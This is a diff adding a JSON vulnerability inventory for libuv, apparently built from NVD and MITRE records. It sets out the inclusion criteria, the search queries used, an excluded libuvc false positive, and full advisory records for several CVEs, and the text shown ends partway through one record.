@@ -1,0 +1,3195 @@
+{
+  "generated_at": "2026-04-09T01:08:01-07:00",
+  "working_directory": "/home/yans/safelibs/port-libuv",
+  "inclusion_policy": {
+    "direct_upstream_libuv": "Include CVEs where NVD or MITRE clearly identify libuv as the affected upstream product.",
+    "libuv_root_cause_in_nodejs": "Include CVEs published under Node.js when the NVD or MITRE text explicitly identifies the vulnerable code path or behavior as libuv.",
+    "libuv_packaging_or_integration": "Include CVEs whose published text explicitly concerns libuv packaging or build integration, even if the affected shipped product is downstream."
+  },
+  "methodology": {
+    "notes": [
+      "Started from NVD keywordSearch=libuv, then filtered false positives.",
+      "Used NVD virtualMatchString queries for direct libuv CPEs and a targeted NVD uv_getaddrinfo query to catch a libuv-rooted Node.js CVE that the plain libuv keyword search misses.",
+      "Used Debian libuv packaging changelog entries from this workspace as additional evidence for CVEs patched in downstream libuv packaging."
+    ],
+    "query_evidence": {
+      "nvd_keyword_libuv": {
+        "source": "NVD",
+        "query": "keywordSearch=libuv",
+        "totalResults": 7,
+        "ids": [
+          "CVE-2015-0278",
+          "CVE-2014-9748",
+          "CVE-2020-8252",
+          "CVE-2024-24806",
+          "CVE-2024-22017",
+          "CVE-2025-47153",
+          "CVE-2026-1991"
+        ]
+      },
+      "nvd_direct_libuv_cpe": {
+        "source": "NVD",
+        "query": "virtualMatchString=cpe:2.3:a:libuv:libuv",
+        "totalResults": 2,
+        "ids": [
+          "CVE-2014-9748",
+          "CVE-2024-24806"
+        ]
+      },
+      "nvd_legacy_libuv_project_cpe": {
+        "source": "NVD",
+        "query": "virtualMatchString=cpe:2.3:a:libuv_project:libuv",
+        "totalResults": 1,
+        "ids": [
+          "CVE-2015-0278"
+        ]
+      },
+      "nvd_uv_getaddrinfo_keyword": {
+        "source": "NVD",
+        "query": "keywordSearch=uv_getaddrinfo",
+        "totalResults": 1,
+        "ids": [
+          "CVE-2021-22918"
+        ]
+      },
+      "local_repo_evidence": [
+        {
+          "path": "original/debian/changelog",
+          "line": 18,
+          "text": "    * Fix CVE-2024-24806 (Closes: #1063484)"
+        },
+        {
+          "path": "original/debian/changelog",
+          "line": 114,
+          "text": "  * add patch for CVE-2021-22918 (Closes: #990561)"
+        },
+        {
+          "path": "original/debian/changelog",
+          "line": 595,
+          "text": "    (Closes: #779173 - CVE-2015-0278)"
+        }
+      ]
+    }
+  },
+  "excluded_candidates": [
+    {
+      "cve_id": "CVE-2026-1991",
+      "reason": "False positive from NVD keywordSearch=libuv; the record is for libuvc, not libuv.",
+      "nvd_snapshot": {
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "A vulnerability was detected in libuvc up to 0.0.7. Affected is the function uvc_scan_streaming of the file src/device.c of the component UVC Descriptor Handler. The manipulation results in null pointer dereference. The attack needs to be approached locally. The exploit is now public and may be used. The project was informed of the problem early through an issue report but has not responded yet."
+          },
+          {
+            "lang": "es",
+            "value": "Se detectó una vulnerabilidad en libuvc hasta la versión 0.0.7. La función uvc_scan_streaming del archivo src/device.c del componente UVC Descriptor Handler está afectada. La manipulación resulta en una desreferencia de puntero nulo. El ataque debe abordarse localmente. El exploit ahora es público y puede ser utilizado. El proyecto fue informado del problema con antelación a través de un informe de incidencias, pero aún no ha respondido."
+          }
+        ],
+        "configurations": [
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:libuvc:libuvc:*:*:*:*:*:*:*:*",
+                    "versionEndIncluding": "0.0.7",
+                    "matchCriteriaId": "44A9C66B-DC71-4CFD-A387-BB990D0EBE89"
+                  }
+                ]
+              }
+            ]
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/libuvc/libuvc/",
+            "source": "cna@vuldb.com",
+            "tags": [
+              "Product"
+            ]
+          },
+          {
+            "url": "https://github.com/libuvc/libuvc/issues/300",
+            "source": "cna@vuldb.com",
+            "tags": [
+              "Exploit",
+              "Vendor Advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/oneafter/0104/blob/main/repro",
+            "source": "cna@vuldb.com",
+            "tags": [
+              "Product"
+            ]
+          },
+          {
+            "url": "https://vuldb.com/?ctiid.344509",
+            "source": "cna@vuldb.com",
+            "tags": [
+              "Permissions Required",
+              "VDB Entry"
+            ]
+          },
+          {
+            "url": "https://vuldb.com/?id.344509",
+            "source": "cna@vuldb.com",
+            "tags": [
+              "Third Party Advisory",
+              "VDB Entry"
+            ]
+          },
+          {
+            "url": "https://vuldb.com/?submit.743388",
+            "source": "cna@vuldb.com",
+            "tags": [
+              "Exploit",
+              "Third Party Advisory",
+              "VDB Entry"
+            ]
+          }
+        ]
+      }
+    }
+  ],
+  "confirmed_cve_count": 7,
+  "confirmed_cve_ids": [
+    "CVE-2014-9748",
+    "CVE-2015-0278",
+    "CVE-2020-8252",
+    "CVE-2021-22918",
+    "CVE-2024-22017",
+    "CVE-2024-24806",
+    "CVE-2025-47153"
+  ],
+  "confirmed_cves": [
+    {
+      "cve_id": "CVE-2014-9748",
+      "scope": "direct_upstream_libuv",
+      "inclusion_rationale": "Direct upstream libuv CVE with NVD CPE coverage for libuv before 1.7.4.",
+      "local_repo_evidence": [],
+      "nvd": {
+        "id": "CVE-2014-9748",
+        "sourceIdentifier": "cve@mitre.org",
+        "published": "2020-02-11T17:15:11.780",
+        "lastModified": "2024-11-21T02:21:34.833",
+        "vulnStatus": "Modified",
+        "cveTags": [],
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "The uv_rwlock_t fallback implementation for Windows XP and Server 2003 in libuv before 1.7.4 does not properly prevent threads from releasing the locks of other threads, which allows attackers to cause a denial of service (deadlock) or possibly have unspecified other impact by leveraging a race condition."
+          },
+          {
+            "lang": "es",
+            "value": "La implementación fallback de uv_rwlock_t para Windows XP y Server 2003 en libuv versiones anteriores a 1.7.4, no impide apropiadamente que los subprocesos (hilos) liberen los bloqueos de otros subprocesos (hilos), lo que permite a atacantes causar una denegación de servicio (punto muerto) o posiblemente tener otro impacto no especificado mediante el aprovechamiento de una condición de carrera."
+          }
+        ],
+        "metrics": {
+          "cvssMetricV31": [
+            {
+              "source": "nvd@nist.gov",
+              "type": "Primary",
+              "cvssData": {
+                "version": "3.1",
+                "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                "baseScore": 8.1,
+                "baseSeverity": "HIGH",
+                "attackVector": "NETWORK",
+                "attackComplexity": "HIGH",
+                "privilegesRequired": "NONE",
+                "userInteraction": "NONE",
+                "scope": "UNCHANGED",
+                "confidentialityImpact": "HIGH",
+                "integrityImpact": "HIGH",
+                "availabilityImpact": "HIGH"
+              },
+              "exploitabilityScore": 2.2,
+              "impactScore": 5.9
+            }
+          ],
+          "cvssMetricV2": [
+            {
+              "source": "nvd@nist.gov",
+              "type": "Primary",
+              "cvssData": {
+                "version": "2.0",
+                "vectorString": "AV:N/AC:M/Au:N/C:P/I:P/A:P",
+                "baseScore": 6.8,
+                "accessVector": "NETWORK",
+                "accessComplexity": "MEDIUM",
+                "authentication": "NONE",
+                "confidentialityImpact": "PARTIAL",
+                "integrityImpact": "PARTIAL",
+                "availabilityImpact": "PARTIAL"
+              },
+              "baseSeverity": "MEDIUM",
+              "exploitabilityScore": 8.6,
+              "impactScore": 6.4,
+              "acInsufInfo": false,
+              "obtainAllPrivilege": false,
+              "obtainUserPrivilege": false,
+              "obtainOtherPrivilege": false,
+              "userInteractionRequired": false
+            }
+          ]
+        },
+        "weaknesses": [
+          {
+            "source": "nvd@nist.gov",
+            "type": "Primary",
+            "description": [
+              {
+                "lang": "en",
+                "value": "CWE-362"
+              }
+            ]
+          }
+        ],
+        "configurations": [
+          {
+            "operator": "AND",
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:libuv:libuv:*:*:*:*:*:*:*:*",
+                    "versionEndExcluding": "1.7.4",
+                    "matchCriteriaId": "9BC7386D-7909-47FB-9B43-E02D9B01A16F"
+                  }
+                ]
+              },
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": false,
+                    "criteria": "cpe:2.3:o:microsoft:windows_server_2003:-:*:*:*:*:*:*:*",
+                    "matchCriteriaId": "E3527F41-A6ED-437D-9833-458A2C60C2A3"
+                  },
+                  {
+                    "vulnerable": false,
+                    "criteria": "cpe:2.3:o:microsoft:windows_xp:-:*:*:*:*:*:*:*",
+                    "matchCriteriaId": "B47EBFCC-1828-45AB-BC6D-FB980929A81A"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:nodejs:node.js:*:*:*:*:*:*:*:*",
+                    "versionStartIncluding": "0.10.0",
+                    "versionEndExcluding": "0.10.46",
+                    "matchCriteriaId": "91D770B4-E1AB-40F6-A9FC-88E0FE860C81"
+                  },
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:nodejs:node.js:*:*:*:*:*:*:*:*",
+                    "versionStartIncluding": "0.12.0",
+                    "versionEndExcluding": "0.12.15",
+                    "matchCriteriaId": "90D7908B-0B23-4CC4-9585-0120DF187A47"
+                  }
+                ]
+              }
+            ]
+          }
+        ],
+        "references": [
+          {
+            "url": "https://github.com/libuv/libuv/issues/515",
+            "source": "cve@mitre.org",
+            "tags": [
+              "Patch",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/pull/516",
+            "source": "cve@mitre.org",
+            "tags": [
+              "Patch",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/nodejs/node/pull/2723",
+            "source": "cve@mitre.org",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://groups.google.com/forum/#%21msg/libuv/KyNnGEXR0OA/NWb605ev2LUJ",
+            "source": "cve@mitre.org"
+          },
+          {
+            "url": "https://groups.google.com/forum/#%21topic/libuv/WO2cl9zasN8",
+            "source": "cve@mitre.org"
+          },
+          {
+            "url": "https://github.com/libuv/libuv/issues/515",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Patch",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/pull/516",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Patch",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/nodejs/node/pull/2723",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://groups.google.com/forum/#%21msg/libuv/KyNnGEXR0OA/NWb605ev2LUJ",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          },
+          {
+            "url": "https://groups.google.com/forum/#%21topic/libuv/WO2cl9zasN8",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          }
+        ]
+      },
+      "mitre": {
+        "containers": {
+          "cna": {
+            "affected": [
+              {
+                "product": "n/a",
+                "vendor": "n/a",
+                "versions": [
+                  {
+                    "status": "affected",
+                    "version": "n/a"
+                  }
+                ]
+              }
+            ],
+            "datePublic": "2014-11-29T00:00:00.000Z",
+            "descriptions": [
+              {
+                "lang": "en",
+                "value": "The uv_rwlock_t fallback implementation for Windows XP and Server 2003 in libuv before 1.7.4 does not properly prevent threads from releasing the locks of other threads, which allows attackers to cause a denial of service (deadlock) or possibly have unspecified other impact by leveraging a race condition."
+              }
+            ],
+            "problemTypes": [
+              {
+                "descriptions": [
+                  {
+                    "description": "n/a",
+                    "lang": "en",
+                    "type": "text"
+                  }
+                ]
+              }
+            ],
+            "providerMetadata": {
+              "dateUpdated": "2020-02-11T16:54:57.000Z",
+              "orgId": "8254265b-2729-46b6-b9e3-3dfca2d5bfca",
+              "shortName": "mitre"
+            },
+            "references": [
+              {
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://groups.google.com/forum/#%21msg/libuv/KyNnGEXR0OA/NWb605ev2LUJ"
+              },
+              {
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://github.com/libuv/libuv/issues/515"
+              },
+              {
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://github.com/libuv/libuv/pull/516"
+              },
+              {
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://github.com/nodejs/node/pull/2723"
+              },
+              {
+                "tags": [
+                  "x_refsource_MISC"
+                ],
+                "url": "https://groups.google.com/forum/#%21topic/libuv/WO2cl9zasN8"
+              }
+            ],
+            "x_legacyV4Record": {
+              "CVE_data_meta": {
+                "ASSIGNER": "cve@mitre.org",
+                "ID": "CVE-2014-9748",
+                "STATE": "PUBLIC"
+              },
+              "affects": {
+                "vendor": {
+                  "vendor_data": [
+                    {
+                      "product": {
+                        "product_data": [
+                          {
+                            "product_name": "n/a",
+                            "version": {
+                              "version_data": [
+                                {
+                                  "version_value": "n/a"
+                                }
+                              ]
+                            }
+                          }
+                        ]
+                      },
+                      "vendor_name": "n/a"
+                    }
+                  ]
+                }
+              },
+              "data_format": "MITRE",
+              "data_type": "CVE",
+              "data_version": "4.0",
+              "description": {
+                "description_data": [
+                  {
+                    "lang": "eng",
+                    "value": "The uv_rwlock_t fallback implementation for Windows XP and Server 2003 in libuv before 1.7.4 does not properly prevent threads from releasing the locks of other threads, which allows attackers to cause a denial of service (deadlock) or possibly have unspecified other impact by leveraging a race condition."
+                  }
+                ]
+              },
+              "problemtype": {
+                "problemtype_data": [
+                  {
+                    "description": [
+                      {
+                        "lang": "eng",
+                        "value": "n/a"
+                      }
+                    ]
+                  }
+                ]
+              },
+              "references": {
+                "reference_data": [
+                  {
+                    "name": "https://groups.google.com/forum/#!msg/libuv/KyNnGEXR0OA/NWb605ev2LUJ",
+                    "refsource": "MISC",
+                    "url": "https://groups.google.com/forum/#!msg/libuv/KyNnGEXR0OA/NWb605ev2LUJ"
+                  },
+                  {
+                    "name": "https://github.com/libuv/libuv/issues/515",
+                    "refsource": "MISC",
+                    "url": "https://github.com/libuv/libuv/issues/515"
+                  },
+                  {
+                    "name": "https://github.com/libuv/libuv/pull/516",
+                    "refsource": "MISC",
+                    "url": "https://github.com/libuv/libuv/pull/516"
+                  },
+                  {
+                    "name": "https://github.com/nodejs/node/pull/2723",
+                    "refsource": "MISC",
+                    "url": "https://github.com/nodejs/node/pull/2723"
+                  },
+                  {
+                    "name": "https://groups.google.com/forum/#!topic/libuv/WO2cl9zasN8",
+                    "refsource": "MISC",
+                    "url": "https://groups.google.com/forum/#!topic/libuv/WO2cl9zasN8"
+                  }
+                ]
+              }
+            }
+          },
+          "adp": [
+            {
+              "providerMetadata": {
+                "orgId": "af854a3a-2127-422b-91ae-364da2661108",
+                "shortName": "CVE",
+                "dateUpdated": "2024-08-06T13:55:04.755Z"
+              },
+              "title": "CVE Program Container",
+              "references": [
+                {
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://groups.google.com/forum/#%21msg/libuv/KyNnGEXR0OA/NWb605ev2LUJ"
+                },
+                {
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://github.com/libuv/libuv/issues/515"
+                },
+                {
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://github.com/libuv/libuv/pull/516"
+                },
+                {
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://github.com/nodejs/node/pull/2723"
+                },
+                {
+                  "tags": [
+                    "x_refsource_MISC",
+                    "x_transferred"
+                  ],
+                  "url": "https://groups.google.com/forum/#%21topic/libuv/WO2cl9zasN8"
+                }
+              ]
+            }
+          ]
+        },
+        "cveMetadata": {
+          "assignerOrgId": "8254265b-2729-46b6-b9e3-3dfca2d5bfca",
+          "assignerShortName": "mitre",
+          "cveId": "CVE-2014-9748",
+          "datePublished": "2020-02-11T16:54:57.000Z",
+          "dateReserved": "2015-10-02T00:00:00.000Z",
+          "dateUpdated": "2024-08-06T13:55:04.755Z",
+          "state": "PUBLISHED"
+        },
+        "dataType": "CVE_RECORD",
+        "dataVersion": "5.1"
+      },
+      "github_repository_security_advisory": null
+    },
+    {
+      "cve_id": "CVE-2015-0278",
+      "scope": "direct_upstream_libuv",
+      "inclusion_rationale": "Direct upstream libuv CVE with NVD legacy libuv_project CPE coverage; also referenced in the Debian libuv package changelog in this workspace.",
+      "local_repo_evidence": [
+        {
+          "path": "original/debian/changelog",
+          "line": 595,
+          "text": "    (Closes: #779173 - CVE-2015-0278)"
+        }
+      ],
+      "nvd": {
+        "id": "CVE-2015-0278",
+        "sourceIdentifier": "secalert@redhat.com",
+        "published": "2015-05-18T15:59:02.713",
+        "lastModified": "2025-04-12T10:46:40.837",
+        "vulnStatus": "Deferred",
+        "cveTags": [],
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "libuv before 0.10.34 does not properly drop group privileges, which allows context-dependent attackers to gain privileges via unspecified vectors."
+          },
+          {
+            "lang": "es",
+            "value": "libuv anterior a 0.10.34 no cancela correctamente los privilegios de grupo, lo que permite a atacantes dependientes de contexto ganar privilegios a través de vectores no especificados."
+          }
+        ],
+        "metrics": {
+          "cvssMetricV2": [
+            {
+              "source": "nvd@nist.gov",
+              "type": "Primary",
+              "cvssData": {
+                "version": "2.0",
+                "vectorString": "AV:N/AC:L/Au:N/C:C/I:C/A:C",
+                "baseScore": 10.0,
+                "accessVector": "NETWORK",
+                "accessComplexity": "LOW",
+                "authentication": "NONE",
+                "confidentialityImpact": "COMPLETE",
+                "integrityImpact": "COMPLETE",
+                "availabilityImpact": "COMPLETE"
+              },
+              "baseSeverity": "HIGH",
+              "exploitabilityScore": 10.0,
+              "impactScore": 10.0,
+              "acInsufInfo": false,
+              "obtainAllPrivilege": false,
+              "obtainUserPrivilege": false,
+              "obtainOtherPrivilege": false,
+              "userInteractionRequired": false
+            }
+          ]
+        },
+        "weaknesses": [
+          {
+            "source": "nvd@nist.gov",
+            "type": "Primary",
+            "description": [
+              {
+                "lang": "en",
+                "value": "CWE-273"
+              }
+            ]
+          }
+        ],
+        "configurations": [
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:o:fedoraproject:fedora:21:*:*:*:*:*:*:*",
+                    "matchCriteriaId": "56BDB5A0-0839-4A20-A003-B8CD56F48171"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:libuv_project:libuv:*:*:*:*:*:*:*:*",
+                    "versionEndIncluding": "0.10.33",
+                    "matchCriteriaId": "1F3C6C6F-0490-4B05-AE01-9384C47659C4"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:nodejs:node.js:*:*:*:*:*:*:*:*",
+                    "versionEndExcluding": "0.10.37",
+                    "matchCriteriaId": "005B0AC4-4F5F-4BFD-8BA4-67570A7B1A4A"
+                  }
+                ]
+              }
+            ]
+          }
+        ],
+        "references": [
+          {
+            "url": "http://advisories.mageia.org/MGASA-2015-0186.html",
+            "source": "secalert@redhat.com",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "http://www.mandriva.com/security/advisories?name=MDVSA-2015:228",
+            "source": "secalert@redhat.com",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/commit/66ab38918c911bcff025562cf06237d7fedaba0c",
+            "source": "secalert@redhat.com",
+            "tags": [
+              "Patch",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/pull/215",
+            "source": "secalert@redhat.com",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://groups.google.com/forum/#%21msg/libuv/0JZxwLMtsMI/jraczskYWWQJ",
+            "source": "secalert@redhat.com"
+          },
+          {
+            "url": "https://lists.fedoraproject.org/pipermail/package-announce/2015-February/150526.html",
+            "source": "secalert@redhat.com",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://security.gentoo.org/glsa/201611-10",
+            "source": "secalert@redhat.com",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "http://advisories.mageia.org/MGASA-2015-0186.html",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "http://www.mandriva.com/security/advisories?name=MDVSA-2015:228",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/commit/66ab38918c911bcff025562cf06237d7fedaba0c",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Patch",
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://github.com/libuv/libuv/pull/215",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://groups.google.com/forum/#%21msg/libuv/0JZxwLMtsMI/jraczskYWWQJ",
+            "source": "af854a3a-2127-422b-91ae-364da2661108"
+          },
+          {
+            "url": "https://lists.fedoraproject.org/pipermail/package-announce/2015-February/150526.html",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          },
+          {
+            "url": "https://security.gentoo.org/glsa/201611-10",
+            "source": "af854a3a-2127-422b-91ae-364da2661108",
+            "tags": [
+              "Third Party Advisory"
+            ]
+          }
+        ]
+      },
+      "mitre": {
+        "containers": {
+          "cna": {
+            "affected": [
+              {
+                "product": "n/a",
+                "vendor": "n/a",
+                "versions": [
+                  {
+                    "status": "affected",
+                    "version": "n/a"
+                  }
+                ]
+              }
+            ],
+            "datePublic": "2015-05-06T00:00:00.000Z",
+            "descriptions": [
+              {
+                "lang": "en",
+                "value": "libuv before 0.10.34 does not properly drop group privileges, which allows context-dependent attackers to gain privileges via unspecified vectors."
+              }
+            ],
+            "problemTypes": [
+              {
+                "descriptions": [
+                  {
+                    "description": "n/a",
+                    "lang": "en",
+                    "type": "text"
+                  }
+                ]
+              }
+            ],
+            "providerMetadata": {
+              "dateUpdated": "2017-06-30T16:57:01.000Z",
+              "orgId": "53f830b8-0a3f-465b-8143-3b8a9948e749",
+              "shortName": "redhat"
+            },
+            "references": [
+              {
+                "tags": [
+                  "x_refsource_CONFIRM"
+                ],
+                "url": "https://groups.google.com/forum/#%21msg/libuv/0JZxwLMtsMI/jraczskYWWQJ"
+              },
+              {
+                "name": "MDVSA-2015:228",
+                "tags": [
+                  "vendor-advisory",
+                  "x_refsource_MANDRIVA"
+                ],
+                "url": "http://www.mandriva.com/security/advisories?name=MDVSA-2015:228"
+              },
+              {
+                "tags": [
+                  "x_refsource_CONFIRM"
+                ],
+                "url": "http://advisories.mageia.org/MGASA-2015-0186.html"
+              },
+              {
+                "name": "FEDORA-2015-2313",
+                "tags": [
+                  "vendor-advisory",
+                  "x_refsource_FEDORA"
+                ],
+                "url": "https://lists.fedoraproject.org/pipermail/package-announce/2015-February/150526.html"
+              },
+              {
+                "tags": [
+                  "x_refsource_CONFIRM"
+                ],
+                "url": "https://github.com/libuv/libuv/pull/215"
+              },
+              {
+                "tags": [
+                  "x_refsource_CONFIRM"
+                ],
+                "url": "https://github.com/libuv/libuv/commit/66ab38918c911bcff025562cf06237d7fedaba0c"
+              },
+              {
+                "name": "GLSA-201611-10",
+                "tags": [
+                  "vendor-advisory",
+                  "x_refsource_GENTOO"
+                ],
+                "url": "https://security.gentoo.org/glsa/201611-10"
+              }
+            ]
+          },
+          "adp": [
+            {
+              "providerMetadata": {
+                "orgId": "af854a3a-2127-422b-91ae-364da2661108",
+                "shortName": "CVE",
+                "dateUpdated": "2024-08-06T04:03:10.551Z"
+              },
+              "title": "CVE Program Container",
+              "references": [
+                {
+                  "tags": [
+                    "x_refsource_CONFIRM",
+                    "x_transferred"
+                  ],
+                  "url": "https://groups.google.com/forum/#%21msg/libuv/0JZxwLMtsMI/jraczskYWWQJ"
+                },
+                {
+                  "name": "MDVSA-2015:228",
+                  "tags": [
+                    "vendor-advisory",
+                    "x_refsource_MANDRIVA",
+                    "x_transferred"
+                  ],
+                  "url": "http://www.mandriva.com/security/advisories?name=MDVSA-2015:228"
+                },
+                {
+                  "tags": [
+                    "x_refsource_CONFIRM",
+                    "x_transferred"
+                  ],
+                  "url": "http://advisories.mageia.org/MGASA-2015-0186.html"
+                },
+                {
+                  "name": "FEDORA-2015-2313",
+                  "tags": [
+                    "vendor-advisory",
+                    "x_refsource_FEDORA",
+                    "x_transferred"
+                  ],
+                  "url": "https://lists.fedoraproject.org/pipermail/package-announce/2015-February/150526.html"
+                },
+                {
+                  "tags": [
+                    "x_refsource_CONFIRM",
+                    "x_transferred"
+                  ],
+                  "url": "https://github.com/libuv/libuv/pull/215"
+                },
+                {
+                  "tags": [
+                    "x_refsource_CONFIRM",
+                    "x_transferred"
+                  ],
+                  "url": "https://github.com/libuv/libuv/commit/66ab38918c911bcff025562cf06237d7fedaba0c"
+                },
+                {
+                  "name": "GLSA-201611-10",
+                  "tags": [
+                    "vendor-advisory",
+                    "x_refsource_GENTOO",
+                    "x_transferred"
+                  ],
+                  "url": "https://security.gentoo.org/glsa/201611-10"
+                }
+              ]
+            }
+          ]
+        },
+        "cveMetadata": {
+          "assignerOrgId": "53f830b8-0a3f-465b-8143-3b8a9948e749",
+          "assignerShortName": "redhat",
+          "cveId": "CVE-2015-0278",
+          "datePublished": "2015-05-18T15:00:00.000Z",
+          "dateReserved": "2014-11-18T00:00:00.000Z",
+          "dateUpdated": "2024-08-06T04:03:10.551Z",
+          "state": "PUBLISHED"
+        },
+        "dataType": "CVE_RECORD",
+        "dataVersion": "5.1"
+      },
+      "github_repository_security_advisory": null
+    },
+    {
+      "cve_id": "CVE-2020-8252",
+      "scope": "libuv_root_cause_in_nodejs",
+      "inclusion_rationale": "Published against Node.js releases, but both NVD and MITRE describe the vulnerable implementation as libuv realpath code used within Node.js.",
+      "local_repo_evidence": [],
+      "nvd": {
+        "id": "CVE-2020-8252",
+        "sourceIdentifier": "support@hackerone.com",
+        "published": "2020-09-18T21:15:13.497",
+        "lastModified": "2024-11-21T05:38:35.650",
+        "vulnStatus": "Modified",
+        "cveTags": [],
+        "descriptions": [
+          {
+            "lang": "en",
+            "value": "The implementation of realpath in libuv < 10.22.1, < 12.18.4, and < 14.9.0 used within Node.js incorrectly determined the buffer size which can result in a buffer overflow if the resolved path is longer than 256 bytes."
+          },
+          {
+            "lang": "es",
+            "value": "La implementación de realpath en libuv versiones anteriores a versiones anteriores a 10.22.1, versiones anteriores a 12.18.4 y versiones anteriores a 14.9.0, usada dentro de Node.js determinó incorrectamente el tamaño del búfer, lo que puede resultar en un desbordamiento del búfer si la ruta resuelta tiene más de 256 bytes"
+          }
+        ],
+        "metrics": {
+          "cvssMetricV31": [
+            {
+              "source": "nvd@nist.gov",
+              "type": "Primary",
+              "cvssData": {
+                "version": "3.1",
+                "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                "baseScore": 7.8,
+                "baseSeverity": "HIGH",
+                "attackVector": "LOCAL",
+                "attackComplexity": "LOW",
+                "privilegesRequired": "LOW",
+                "userInteraction": "NONE",
+                "scope": "UNCHANGED",
+                "confidentialityImpact": "HIGH",
+                "integrityImpact": "HIGH",
+                "availabilityImpact": "HIGH"
+              },
+              "exploitabilityScore": 1.8,
+              "impactScore": 5.9
+            }
+          ],
+          "cvssMetricV2": [
+            {
+              "source": "nvd@nist.gov",
+              "type": "Primary",
+              "cvssData": {
+                "version": "2.0",
+                "vectorString": "AV:L/AC:L/Au:N/C:P/I:P/A:P",
+                "baseScore": 4.6,
+                "accessVector": "LOCAL",
+                "accessComplexity": "LOW",
+                "authentication": "NONE",
+                "confidentialityImpact": "PARTIAL",
+                "integrityImpact": "PARTIAL",
+                "availabilityImpact": "PARTIAL"
+              },
+              "baseSeverity": "MEDIUM",
+              "exploitabilityScore": 3.9,
+              "impactScore": 6.4,
+              "acInsufInfo": false,
+              "obtainAllPrivilege": false,
+              "obtainUserPrivilege": false,
+              "obtainOtherPrivilege": false,
+              "userInteractionRequired": false
+            }
+          ]
+        },
+        "weaknesses": [
+          {
+            "source": "support@hackerone.com",
+            "type": "Secondary",
+            "description": [
+              {
+                "lang": "en",
+                "value": "CWE-120"
+              }
+            ]
+          },
+          {
+            "source": "nvd@nist.gov",
+            "type": "Primary",
+            "description": [
+              {
+                "lang": "en",
+                "value": "CWE-120"
+              }
+            ]
+          }
+        ],
+        "configurations": [
+          {
+            "nodes": [
+              {
+                "operator": "OR",
+                "negate": false,
+                "cpeMatch": [
+                  {
+                    "vulnerable": true,
+                    "criteria": "cpe:2.3:a:nodejs:node.js:*:*:*:*:lts:*:*:*",
+                    "versionStartIncluding": "10.0.0",
+                    "versionEndExcluding": "10.22.1",
+                    "matchCriteriaId": "3161B3E1-1269-4718-AE6A-2C122E1B52D3"
+                  },
+                  {
+                    "vulnerable": true,
